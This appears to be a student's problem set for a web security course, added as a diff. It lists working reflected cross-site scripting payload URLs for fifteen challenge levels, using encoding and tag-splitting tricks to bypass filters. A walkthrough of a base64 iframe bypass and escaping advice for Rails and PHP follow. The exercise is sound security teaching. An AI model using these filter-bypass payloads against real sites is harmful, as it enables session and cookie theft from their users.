@@ -1,0 +1,68 @@
+Scott Kinder, problem set #1 info415
+Vulnerabilities
+0. http://xss-challenges.r7.io/0/login?username=%3Cscript%3Ealert%280%29%3B%3C%2Fscript%3E&password=erw&user_language=english
+1. http://xss-challenges.r7.io/1/login?username=%27%3E%3Cscript%3Ealert%280%29%3B%3C%2Fscript%3E&password=rret&user_language=english 
+2. http://xss-challenges.r7.io/2/login?username=the&password=fgd&user_language=%27;%20alert%280%29;%20var%20the%20=%20%27
+3. http://xss-challenges.r7.io/3/login?username=%22%27%3Egoats&password=fsf&user_language=%27;%20alert%280%29;%20var%20the%20=%20%27
+4. http://xss-challenges.r7.io/4/login?username=%3Cscscriptript%3Ealert%280%29%3B%3C%2Fscscriptript%3E&password=sa&user_language=english
+5. http://xss-challenges.r7.io/5/login?username=%3Cbody%2Fonload%3Dalert%280%29%3E&password=wer&user_language=english credit: Cvetan
+6. http://xss-challenges.r7.io/6/login?username=%3Cbody%2Fonload%3Dalert%280%29%3E&password=dsf&user_language=english credit: Cvetan
+7. http://xss-challenges.r7.io/7/login?username=%27+onmouseover%3Dalert%280%29+class%3D%27&password=dsfd&user_language=english
+8. http://xss-challenges.r7.io/8/login?username=%27+onmouseover%3Dax61%3Blert%280%29+class%3D%27&password=dsf&user_language=english credit: Drew K.
+9. http://xss-challenges.r7.io/9/login?username=%27%20onmouseover=%26%23x61;%26%23x6C;er%26%23x74;%26%23x28;0%26%23x29;%20class=%27&password=sdf&user_language=english
+10. http://xss-challenges.r7.io/10/login?username=%27+onmouseover%3D\u0061lert%280%29+class%3D%27&password=sdf&user_language=english
+11. http://xss-challenges.r7.io/11/login?username=%27+onmouseover%3Da%26%23x6C%3Bert%280%29+class%3D%27&password=sad&user_language=english
+12. http://xss-challenges.r7.io/12/login?username=\u0022%29%3B+\u003Cscript\u003Ealert%280%29\u003C%2Fscript\u003E&password=dsf&user_language=english
+13. http://xss-challenges.r7.io/13/login?username=\u0022%29%3B+\u003Cscript\u003Ealert%280%29\u003C%2Fscript\u003E&password=dsf&user_language=english
+14. http://xss-challenges.r7.io/14/login?username=%3Ciframe+src%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5wYXJlbnQuYWxlcnQoMCk7PC9zY3JpcHQ%2B%22%3E%3C%2Fiframe%3E&password=sad&user_language=english
+15. n/a
+16. n/a
+
+The Report
+Description
+	In this problem set, we looked at reflected cross-site scripting. Reflected means
+	that an attacker could generate a link that they could send to people which could
+	execute any arbitrary javascript code the attacker wants to execute on the user.
+	This is bad because an attacker could do things like steal your cookies, keylog your browser
+	(for the page, but that could reveal your password), as well as all the other bad things
+	with XSS.
+	
+Test Steps
+#14:
+	For #14, it is escaping quote characters, replacing vital letters, and not accepting
+	encoded values. However, we can insert "<" and ">" which is a big give away that you
+	probably need to use some special tag here. Up to this point we haven't needed iframes, but
+	this is really a perfect place to use it. This is because you can define the source (src) of
+	an iframe, which will execute with whatever code is on the page of the src. Well, if the
+	iframe's src just so happens to be a little snippet of javascript in <script> tag's we have
+	XSS. However, its not that easy to just type in plain text, so we have to find a different
+	way to encode in. In this case, there is a pretty well known way to pass base64 values in HTML,
+	with a little method. The method is to do "data:text/html;base64,<value>", with <value> being
+	your base64 encoded value. With a little tool online you can find a plaintext->base64 encoder,
+	so if you encode your "<script>alert(0)</script>" into base64, pass whatever that string is into
+	the little method, then it will render and execute the XSS on this page.
+	
+Mitigations
+Ruby On Rails
+	As usual, it is very important to filter input and escape the output. In Ruby, the
+	strip_tags function does a decent job removing tags. However, you must do more; before
+	anything is outputted to the page, make sure to use escapeHTML(), which will turn things like
+	"<" into "&lt;". Lastly, to avoid encoding attacks which were a big part of this HW,
+	use the Rails "sanitize()" method.
+
+PHP
+	Just like in Ruby, we really don't want to allow tags for user input, so we should use
+	htmlspecialchars($data) on user input. You can also define what encoding scheme to use so they
+	can't avoid that by passing weird encoding schemes. To protect user's cookies, use HTTP-only
+	cookies unless for some reason you need javascript to access them. Always use valid HTML syntax,
+	be wary in places where user input goes, and on get requests.
+
+References
+	This website was helpful occasionally: https://github.com/MaTachi/MaTachi.github.io/blob/master/src/pages/solutions-to-the-wargame-xss-challenges-at-xss-quiz-int21h-jp.md
+	I used this for finding encoded values: http://ha.ckers.org/xsscalc.html
+	Ruby On Rails XSS prevention security website: http://guides.rubyonrails.org/security.html#cross-site-scripting-xss
+	Cvetan gave me a few reminders for 5 and 6, and I agreed with him that body onload was probably the
+	best for that case. Drew Khaw and I worked for a long time on 8 because we were stuck on encoding, and we
+	figured it out together, which is why I credited him there. #14 I did find a great resource in the github link above,
+	and although I could copy and paste an answer from there, I still had to make it alert(0) instead of whatever it alerted,
+	so I did have to figure out what to put in the base64 place; but I did get the iframe idea from that site.
